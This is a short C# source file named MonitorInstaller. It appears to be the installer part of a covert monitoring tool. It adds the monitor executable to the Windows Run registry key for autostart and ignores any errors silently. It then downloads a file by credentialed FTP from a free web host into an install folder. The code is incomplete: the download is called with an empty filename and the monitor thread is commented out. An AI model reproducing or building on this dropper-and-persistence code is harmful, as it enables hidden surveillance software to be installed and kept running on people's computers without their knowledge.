using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace MonitorInstaller
{
    class Program
    {
        static void Main(string[] args)
        {

            AddRegistry();
            DownloadManager("");
            //Thread startMonitor = new Thread();

        }

        static void AddRegistry() // enable autostart for executables
        {
            try
            {
                string keyname = @"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
                Registry.SetValue(keyname, Config.cRegVal, '"' + Config.monitorPath+ '"', RegistryValueKind.String);

            }
            catch
            { }
        }

        public static void DownloadManager(string Server_Fn)
        {


            using (WebClient request = new WebClient())
            {
                request.Credentials = new NetworkCredential(Config.ftpUsername1, Config.ftpPassword1);

                byte[] fileData = request.DownloadData("ftp://files.000webhost.com/" + Server_Fn);

                using (FileStream file = File.Create(Config.InstallFolder + Server_Fn))
                {
                    file.Write(fileData, 0, fileData.Length);
                    file.Close();
                }

            }

        }





    }
}
